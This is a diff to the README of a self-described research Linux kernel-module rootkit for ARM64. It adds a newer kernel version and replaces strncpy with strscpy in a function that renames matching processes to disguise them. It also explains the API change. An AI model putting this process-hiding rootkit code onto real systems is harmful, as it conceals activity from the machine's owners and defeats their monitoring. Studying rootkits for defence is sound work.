@@ -1,6 +1,6 @@
 # Linux Rootkit — Loadable Kernel Module
 
-> **Environment:** AArch64 (ARM64), Linux mainline v5.15 / v6.18
+> **Environment:** AArch64 (ARM64), Linux mainline v5.15 / v6.18 / v7.2
 
 A research rootkit implemented as a Linux Loadable Kernel Module (LKM). LKMs run in kernel mode with full access to kernel internals — the same mechanism used by device drivers, but here used to hook syscalls and hide activity from userspace.
 
@@ -237,14 +237,15 @@ int change_process_name(const char *orig_name, const char *new_name)
     struct task_struct *p = NULL;
     for_each_process(p) {
         if (strcmp(p->comm, orig_name) == 0) {
-            strncpy(p->comm, new_name, TASK_COMM_LEN - 1);
-            p->comm[TASK_COMM_LEN - 1] = '\0';
+            strscpy(p->comm, new_name, sizeof(p->comm));
         }
     }
 }
 ```
 
 The caller in `lkm_ioctl` skips any rename where `strlen(new_name) >= strlen(orig_name)` to prevent overflowing the fixed-size field.
+
+`strscpy()` is used instead of `strncpy()` — the latter was removed from the kernel in v7.2 (it never guaranteed NUL-termination and unconditionally zero-padded the rest of the buffer). `strscpy()` has been available since v4.3, so this works unchanged across v5.15 / v6.18 / v7.2.
 
 ### Hooked Syscalls
 
